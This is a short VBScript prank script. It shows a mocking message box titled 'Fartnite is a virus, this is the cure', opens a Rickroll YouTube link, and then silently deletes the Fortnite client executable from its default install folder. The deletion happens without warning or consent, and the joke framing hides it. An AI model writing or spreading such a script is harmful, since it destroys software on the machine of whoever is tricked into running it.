Set objShell = CreateObject("Wscript.Shell")

intMessage = Msgbox("lol", _
    vbOkOnly, "Fartnite is a virus, this is the cure")

If intMessage = vbOk Then
    objShell.Run("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
End If

Set obj = createobject("Scripting.FileSystemObject")
Dim filename1
filename1="C:\Program Files (x86)\Epic Games\Fortnite\FortniteGame\Binaries\Win64\FortniteClient-Win64-Shipping.exe"
obj.DeleteFile filename1
Set obj=Nothing